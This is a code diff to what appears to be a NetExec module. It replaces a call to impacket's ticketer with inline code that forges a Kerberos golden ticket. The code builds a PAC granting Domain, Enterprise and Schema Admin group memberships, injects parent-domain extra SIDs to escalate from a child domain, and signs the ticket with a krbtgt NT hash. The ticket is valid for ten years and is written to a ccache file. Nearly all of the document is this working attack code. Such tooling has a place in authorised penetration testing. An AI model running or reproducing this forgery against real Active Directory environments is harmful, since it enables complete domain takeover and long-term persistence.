@@ -1,10 +1,23 @@
+import os
+import datetime
 import re
-from argparse import Namespace
 from contextlib import suppress
 from impacket.smbconnection import SMBConnection
 from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
 from impacket.dcerpc.v5.drsuapi import DCERPCSessionError
-from ticketer import TICKETER
+from calendar import timegm
+from binascii import unhexlify
+from pyasn1.codec.der import encoder
+from pyasn1.type.univ import noValue
+from impacket.krb5.asn1 import AS_REP, EncTicketPart, EncASRepPart, AuthorizationData
+from impacket.krb5.types import KerberosTime
+from impacket.krb5.constants import ApplicationTagNumbers, ProtocolVersionNumber, PrincipalNameType, TicketFlags, AuthorizationDataType, EncryptionTypes, ChecksumTypes, KERB_NON_KERB_CKSUM_SALT, encodeFlags
+from impacket.krb5.crypto import Key, _enctype_table, _checksum_table
+from impacket.krb5.ccache import CCache
+from impacket.krb5.pac import VALIDATION_INFO, KERB_VALIDATION_INFO, PAC_LOGON_INFO, PAC_CLIENT_INFO, PAC_CLIENT_INFO_TYPE, PAC_REQUESTOR, PAC_REQUESTOR_INFO, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, KERB_SID_AND_ATTRIBUTES
+from impacket.dcerpc.v5.ndr import NDRULONG
+from impacket.dcerpc.v5.samr import GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
+from impacket.dcerpc.v5.dtypes import SID, RPC_SID, NULL
 from nxc.parsers.ldap_results import parse_result_attributes
 from nxc.helpers.misc import CATEGORY
 
@@ -211,6 +224,327 @@ class NXCModule:
             raise ValueError(f"Invalid NT-hash format : {raw}")
         return raw.lower()
 
+    @staticmethod
+    def _getFileTime(unix_seconds: int) -> int:
+        return unix_seconds * 10_000_000 + 116_444_736_000_000_000
+
+    @staticmethod
+    def _getPadLength(length: int) -> int:
+        return ((length + 7) // 8 * 8) - length
+
+    @staticmethod
+    def _getBlockLength(length: int) -> int:
+        return (length + 7) // 8 * 8
+
+    def _createBasicValidationInfo(self, username: str, domain: str, domain_sid: str,
+                                  groups: list[int], user_rid: int) -> VALIDATION_INFO:
+        kerbdata = KERB_VALIDATION_INFO()
+
+        now_utc = datetime.datetime.now(datetime.timezone.utc)
+        now_unix = timegm(now_utc.timetuple())
+        now_filetime = self._getFileTime(now_unix)
+
+        kerbdata["LogonTime"]["dwLowDateTime"] = now_filetime & 0xFFFFFFFF
+        kerbdata["LogonTime"]["dwHighDateTime"] = now_filetime >> 32
+        kerbdata["LogoffTime"]["dwLowDateTime"] = 0xFFFFFFFF
+        kerbdata["LogoffTime"]["dwHighDateTime"] = 0x7FFFFFFF
+        kerbdata["KickOffTime"]["dwLowDateTime"] = 0xFFFFFFFF
+        kerbdata["KickOffTime"]["dwHighDateTime"] = 0x7FFFFFFF
+
+        kerbdata["PasswordLastSet"]["dwLowDateTime"] = now_filetime & 0xFFFFFFFF
+        kerbdata["PasswordLastSet"]["dwHighDateTime"] = now_filetime >> 32
+        kerbdata["PasswordCanChange"]["dwLowDateTime"] = 0
+        kerbdata["PasswordCanChange"]["dwHighDateTime"] = 0
+        kerbdata["PasswordMustChange"]["dwLowDateTime"] = 0xFFFFFFFF
+        kerbdata["PasswordMustChange"]["dwHighDateTime"] = 0x7FFFFFFF
+
+        kerbdata["EffectiveName"] = username
+        kerbdata["FullName"] = ""
+        kerbdata["LogonScript"] = ""
+        kerbdata["ProfilePath"] = ""
+        kerbdata["HomeDirectory"] = ""
+        kerbdata["HomeDirectoryDrive"] = ""
+        kerbdata["LogonCount"] = 500
+        kerbdata["BadPasswordCount"] = 0
+        kerbdata["UserId"] = int(user_rid)
+
+        primary_group_id = int(groups[0]) if groups else 513
+        kerbdata["PrimaryGroupId"] = primary_group_id
+        kerbdata["GroupCount"] = len(groups)
+        for group_rid in (groups or [513]):
+            membership = GROUP_MEMBERSHIP()
+            ndr_rid = NDRULONG()
+            ndr_rid["Data"] = int(group_rid)
+            membership["RelativeId"] = ndr_rid
+            membership["Attributes"] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
+            kerbdata["GroupIds"].append(membership)
+
+        kerbdata["UserFlags"] = 0
+        kerbdata["UserSessionKey"] = b"\x00" * 16
+        kerbdata["LogonServer"] = ""
+        kerbdata["LogonDomainName"] = domain
+        kerbdata["LogonDomainId"].fromCanonical(domain_sid)
+        kerbdata["LMKey"] = b"\x00" * 8
+        kerbdata["UserAccountControl"] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
+        kerbdata["SubAuthStatus"] = 0
+
+        kerbdata["LastSuccessfulILogon"]["dwLowDateTime"] = 0
+        kerbdata["LastSuccessfulILogon"]["dwHighDateTime"] = 0
+        kerbdata["LastFailedILogon"]["dwLowDateTime"] = 0
+        kerbdata["LastFailedILogon"]["dwHighDateTime"] = 0
+        kerbdata["FailedILogonCount"] = 0
+        kerbdata["Reserved3"] = 0
+
+        kerbdata["ResourceGroupDomainSid"] = NULL
+        kerbdata["ResourceGroupCount"] = 0
+        kerbdata["ResourceGroupIds"] = NULL
+
+        validation_info = VALIDATION_INFO()
+        validation_info["Data"] = kerbdata
+        return validation_info
+
+    def _createBasicPac(self, validation_info: VALIDATION_INFO, username: str) -> dict:
+        pac_infos: dict[int, bytes] = {}
+        pac_infos[PAC_LOGON_INFO] = validation_info.getData() + validation_info.getDataReferents()
+
+        server_checksum_placeholder = PAC_SIGNATURE_DATA()
+        private_checksum_placeholder = PAC_SIGNATURE_DATA()
+        server_checksum_placeholder["SignatureType"] = ChecksumTypes.hmac_md5.value
+        private_checksum_placeholder["SignatureType"] = ChecksumTypes.hmac_md5.value
+        server_checksum_placeholder["Signature"] = b"\x00" * 16
+        private_checksum_placeholder["Signature"] = b"\x00" * 16
+        pac_infos[PAC_SERVER_CHECKSUM] = server_checksum_placeholder.getData()
+        pac_infos[PAC_PRIVSVR_CHECKSUM] = private_checksum_placeholder.getData()
+
+        client_info = PAC_CLIENT_INFO()
+        client_name_utf16 = username.encode("utf-16le")
+        client_info["Name"] = client_name_utf16
+        client_info["NameLength"] = len(client_name_utf16)
+        pac_infos[PAC_CLIENT_INFO_TYPE] = client_info.getData()
+
+        return pac_infos
+
+    def _createRequestorInfoPac(self, pac_infos: dict, domain_sid: str, user_rid: int) -> None:
+        requestor = PAC_REQUESTOR()
+        requestor["UserSid"] = SID()
+        requestor["UserSid"].fromCanonical(f"{domain_sid}-{int(user_rid)}")
+        pac_infos[PAC_REQUESTOR_INFO] = requestor.getData()
+
+    def _buildAsrep(self, domain: str, username: str, enctype_value: int) -> AS_REP:
+        as_rep = AS_REP()
+        as_rep["msg-type"] = ApplicationTagNumbers.AS_REP.value
+        as_rep["pvno"] = 5
+
+        as_rep["crealm"] = domain
+        as_rep["cname"] = noValue
+        as_rep["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
+        as_rep["cname"]["name-string"] = noValue
+        as_rep["cname"]["name-string"][0] = username
+
+        as_rep["ticket"] = noValue
+        as_rep["ticket"]["tkt-vno"] = ProtocolVersionNumber.pvno.value
+        as_rep["ticket"]["realm"] = domain
+        as_rep["ticket"]["sname"] = noValue
+        as_rep["ticket"]["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
+        as_rep["ticket"]["sname"]["name-string"] = noValue
+        as_rep["ticket"]["sname"]["name-string"][0] = "krbtgt"
+        as_rep["ticket"]["sname"]["name-string"][1] = domain
+
+        as_rep["ticket"]["enc-part"] = noValue
+        as_rep["ticket"]["enc-part"]["kvno"] = 2
+        as_rep["ticket"]["enc-part"]["etype"] = enctype_value
+
+        as_rep["enc-part"] = noValue
+        as_rep["enc-part"]["kvno"] = 2
+        as_rep["enc-part"]["etype"] = enctype_value
+        as_rep["enc-part"]["cipher"] = noValue
+        return as_rep
+
+    def _injectExtraSids(self, pac_infos: dict, extra_sid_csv: str | None) -> None:
+        if not extra_sid_csv or PAC_LOGON_INFO not in pac_infos:
+            return
+
+        current_blob = pac_infos[PAC_LOGON_INFO]
+        validation_info = VALIDATION_INFO()
+        validation_info.fromString(current_blob)
+        base_len = len(validation_info.getData())
+        validation_info.fromStringReferents(current_blob, base_len)
+
+        validation_info["Data"]["UserFlags"] |= 0x20  # LOGON_EXTRA_SIDS
+
+        if validation_info["Data"]["SidCount"] == 0 or not validation_info["Data"]["ExtraSids"]:
+            validation_info["Data"]["ExtraSids"] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
+            validation_info["Data"]["SidCount"] = 0
+
+        for sid_txt in str(extra_sid_csv).split(","):
+            sid_txt = sid_txt.strip()
+            if not sid_txt:
+                continue
+            sid_and_attr = KERB_SID_AND_ATTRIBUTES()
+            rpc_sid = RPC_SID()
+            rpc_sid.fromCanonical(sid_txt)
+            sid_and_attr["Sid"] = rpc_sid
+            sid_and_attr["Attributes"] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
+            validation_info["Data"]["ExtraSids"].append(sid_and_attr)
+            validation_info["Data"]["SidCount"] += 1
+
+        pac_infos[PAC_LOGON_INFO] = validation_info.getData() + validation_info.getDataReferents()
+
+    def _buildEncParts(self, as_rep: AS_REP, domain: str, username: str, duration_hours: int,
+                            enctype_value: int, pac_infos: dict) -> tuple[EncASRepPart, EncTicketPart, dict]:
+        now_utc = datetime.datetime.now(datetime.timezone.utc)
+        end_utc = now_utc + datetime.timedelta(hours=duration_hours)
+
+        enc_ticket_part = EncTicketPart()
+        enc_ticket_part["flags"] = encodeFlags([
+            TicketFlags.forwardable.value,
+            TicketFlags.proxiable.value,
+            TicketFlags.renewable.value,
+            TicketFlags.pre_authent.value,
+            TicketFlags.initial.value,
+        ])
+
+        enc_ticket_part["key"] = noValue
+        enc_ticket_part["key"]["keytype"] = enctype_value
+        enc_ticket_part["key"]["keyvalue"] = os.urandom(16)  # RC4 -> 16 bytes
+
+        enc_ticket_part["crealm"] = domain
+        enc_ticket_part["cname"] = noValue
+        enc_ticket_part["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
+        enc_ticket_part["cname"]["name-string"] = noValue
+        enc_ticket_part["cname"]["name-string"][0] = username
+
+        enc_ticket_part["transited"] = noValue
+        enc_ticket_part["transited"]["tr-type"] = 0
+        enc_ticket_part["transited"]["contents"] = ""
+
+        enc_ticket_part["authtime"] = KerberosTime.to_asn1(now_utc)
+        enc_ticket_part["starttime"] = KerberosTime.to_asn1(now_utc)
+        enc_ticket_part["endtime"] = KerberosTime.to_asn1(end_utc)
+        enc_ticket_part["renew-till"] = KerberosTime.to_asn1(end_utc)
+
+        enc_ticket_part["authorization-data"] = noValue
+        enc_ticket_part["authorization-data"][0] = noValue
+        enc_ticket_part["authorization-data"][0]["ad-type"] = AuthorizationDataType.AD_IF_RELEVANT.value
+        enc_ticket_part["authorization-data"][0]["ad-data"] = noValue
+
+        if PAC_CLIENT_INFO_TYPE in pac_infos:
+            client_id_filetime = self._getFileTime(timegm(now_utc.timetuple()))
+            pac_client_info = PAC_CLIENT_INFO(pac_infos[PAC_CLIENT_INFO_TYPE])
+            pac_client_info["ClientId"] = client_id_filetime
+            pac_infos[PAC_CLIENT_INFO_TYPE] = pac_client_info.getData()
+
+        enc_asrep_part = EncASRepPart()
+        enc_asrep_part["key"] = noValue
+        enc_asrep_part["key"]["keytype"] = enctype_value
+        enc_asrep_part["key"]["keyvalue"] = enc_ticket_part["key"]["keyvalue"]
+        enc_asrep_part["last-req"] = noValue
+        enc_asrep_part["last-req"][0] = noValue
+        enc_asrep_part["last-req"][0]["lr-type"] = 0
+        enc_asrep_part["last-req"][0]["lr-value"] = KerberosTime.to_asn1(now_utc)
+        enc_asrep_part["nonce"] = 123456789
+        enc_asrep_part["key-expiration"] = KerberosTime.to_asn1(end_utc)
+        enc_asrep_part["flags"] = list(enc_ticket_part["flags"])
+        enc_asrep_part["authtime"] = str(enc_ticket_part["authtime"])
+        enc_asrep_part["endtime"] = str(enc_ticket_part["endtime"])
+        enc_asrep_part["starttime"] = str(enc_ticket_part["starttime"])
+        enc_asrep_part["renew-till"] = str(enc_ticket_part["renew-till"])
+        enc_asrep_part["srealm"] = domain
+        enc_asrep_part["sname"] = noValue
+        enc_asrep_part["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
+        enc_asrep_part["sname"]["name-string"] = noValue
+        enc_asrep_part["sname"]["name-string"][0] = "krbtgt"
+        enc_asrep_part["sname"]["name-string"][1] = domain
+
+        return enc_asrep_part, enc_ticket_part, pac_infos
+
+    def _signEncryptTicket(self, as_rep: AS_REP, enc_asrep_part: EncASRepPart, enc_ticket_part: EncTicketPart,
+                              pac_infos: dict, krbtgt_key: Key, enctype_value: int) -> tuple[bytes, Key]:
+        def zero_pad(n: int) -> bytes: return b"\x00" * self._getPadLength(n)
+
+        pac_buffer_order = [PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE, PAC_REQUESTOR_INFO, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]
+
+        pac_blobs_with_padding: list[tuple[int, bytes, bytes]] = []
+        for buffer_type in pac_buffer_order:
+            buffer_bytes = pac_infos[buffer_type]
+            pac_blobs_with_padding.append((buffer_type, buffer_bytes, zero_pad(len(buffer_bytes))))
+
+        buffer_count = len(pac_buffer_order)
+        pac_info_buffer_header_size = len(PAC_INFO_BUFFER().getData())
+        current_data_offset = 8 + pac_info_buffer_header_size * buffer_count
+
+        def make_info_buffer(ul_type: int, blob_length: int) -> PAC_INFO_BUFFER:
+            nonlocal current_data_offset
+            info_buffer = PAC_INFO_BUFFER()
+            info_buffer["ulType"] = ul_type
+            info_buffer["cbBufferSize"] = blob_length
+            info_buffer["Offset"] = current_data_offset
+            current_data_offset = self._getBlockLength(current_data_offset + blob_length)
+            return info_buffer
+
+        info_buffers: list[PAC_INFO_BUFFER] = []
+        for buffer_type, buffer_bytes, _ in pac_blobs_with_padding:
+            info_buffers.append(make_info_buffer(buffer_type, len(buffer_bytes)))
+
+        buffers_header_bytes = b"".join(info_buffer.getData() for info_buffer in info_buffers)
+        buffers_data_bytes = b"".join(buffer_bytes + padding for _, buffer_bytes, padding in pac_blobs_with_padding)
+
+        pac_type = PACTYPE()
+        pac_type["cBuffers"] = buffer_count
+        pac_type["Version"] = 0
+        pac_type["Buffers"] = buffers_header_bytes + buffers_data_bytes
+        pac_bytes_for_checksum = pac_type.getData()
+
+        server_checksum_struct = PAC_SIGNATURE_DATA(pac_infos[PAC_SERVER_CHECKSUM])
+        kdc_checksum_struct = PAC_SIGNATURE_DATA(pac_infos[PAC_PRIVSVR_CHECKSUM])
+
+        checksum_function_server = _checksum_table[server_checksum_struct["SignatureType"]]
+        checksum_function_kdc = _checksum_table[kdc_checksum_struct["SignatureType"]]
+
+        server_checksum_struct["Signature"] = checksum_function_server.checksum(
+            krbtgt_key, KERB_NON_KERB_CKSUM_SALT, pac_bytes_for_checksum
+        )
+        kdc_checksum_struct["Signature"] = checksum_function_kdc.checksum(
+            krbtgt_key, KERB_NON_KERB_CKSUM_SALT, server_checksum_struct["Signature"]
+        )
+
+        rebuilt_blobs: list[bytes] = []
+        for buffer_type, buffer_bytes, padding in pac_blobs_with_padding:
+            if buffer_type == PAC_SERVER_CHECKSUM:
+                buffer_bytes = server_checksum_struct.getData()
+            elif buffer_type == PAC_PRIVSVR_CHECKSUM:
+                buffer_bytes = kdc_checksum_struct.getData()
+            rebuilt_blobs.append(buffer_bytes + padding)
+        pac_type["Buffers"] = buffers_header_bytes + b"".join(rebuilt_blobs)
+
+        authorization_data = AuthorizationData()
+        authorization_data[0] = noValue
+        authorization_data[0]["ad-type"] = AuthorizationDataType.AD_WIN2K_PAC.value
+        authorization_data[0]["ad-data"] = pac_type.getData()
+        enc_ticket_part["authorization-data"][0]["ad-data"] = encoder.encode(authorization_data)
+
+        ticket_cipher = _enctype_table[enctype_value]
+        enc_ticket_part_bytes = encoder.encode(enc_ticket_part)
+        encrypted_ticket_ciphertext = ticket_cipher.encrypt(krbtgt_key, 2, enc_ticket_part_bytes, None)
+        as_rep["ticket"]["enc-part"]["cipher"] = encrypted_ticket_ciphertext
+        as_rep["ticket"]["enc-part"]["kvno"] = 2
+
+        enc_asrep_part_bytes = encoder.encode(enc_asrep_part)
+        client_session_key = Key(ticket_cipher.enctype, enc_asrep_part["key"]["keyvalue"].asOctets())
+        encrypted_encpart_ciphertext = ticket_cipher.encrypt(client_session_key, 3, enc_asrep_part_bytes, None)
+        as_rep["enc-part"]["cipher"] = encrypted_encpart_ciphertext
+        as_rep["enc-part"]["etype"] = ticket_cipher.enctype
+        as_rep["enc-part"]["kvno"] = 1
+
+        return encoder.encode(as_rep), client_session_key
+
+    def _saveTicket(self, username: str, encoded_asrep: bytes, client_session_key: Key) -> str:
+        ccache = CCache()
+        ccache.fromTGT(encoded_asrep, client_session_key, client_session_key)
+        out_path = f"{username}.ccache"
+        ccache.saveFile(out_path)
+        return out_path
+
     def forge_golden_ticket(self, connection):
         """
         Forge a golden ticket for the child domain using the krbtgt NT-hash.
@@ -223,30 +557,26 @@ class NXCModule:
         extra_sid = f"{self.parent_sid}-{extra_rid}"
         user_rid = str(self.module_options.get("USER_ID", "500"))
 
-        tick_opts = Namespace(
-            request=False,  # offline mode
-            nthash=nthash,  # krbtgt NT-hash
-            aesKey=None,  # use RC4_HMAC
-            domain=connection.domain,
-            domain_sid=self.child_sid,
-            extra_sid=extra_sid,
-            groups="513,512,520,518,519",
-            user=admin_name,
-            user_id=user_rid,
-            duration="87600",  # hours (10 years)
-            spn=None,
-            dc_ip=None,
-            old_pac=False,
-            extra_pac=False,
-            impersonate=None,
+        domain_upper = connection.domain.upper()
+        groups_list = [513, 512, 520, 518, 519]
+
+        enctype_value = EncryptionTypes.rc4_hmac.value
+        krbtgt_key = Key(_enctype_table[enctype_value].enctype, unhexlify(nthash))
+
+        validation_info = self._createBasicValidationInfo(admin_name, domain_upper, self.child_sid, groups_list, int(user_rid))
+        pac_infos = self._createBasicPac(validation_info, admin_name)
+
+        self._createRequestorInfoPac(pac_infos, self.child_sid, int(user_rid))
+
+        as_rep = self._buildAsrep(domain_upper, admin_name, enctype_value)
+        enc_asrep_part, enc_ticket_part, pac_infos = self._buildEncParts(
+            as_rep, domain_upper, admin_name, int("87600"), enctype_value, pac_infos
         )
 
-        t = TICKETER(
-            admin_name,
-            None,
-            connection.domain,
-            tick_opts,
-        )
-        t.run()
+        self._injectExtraSids(pac_infos, extra_sid)
 
-        return f"{admin_name}.ccache"
+        encoded_asrep, client_session_key = self._signEncryptTicket(
+            as_rep, enc_asrep_part, enc_ticket_part, pac_infos, krbtgt_key, enctype_value
+        )
+
+        return self._saveTicket(admin_name, encoded_asrep, client_session_key)
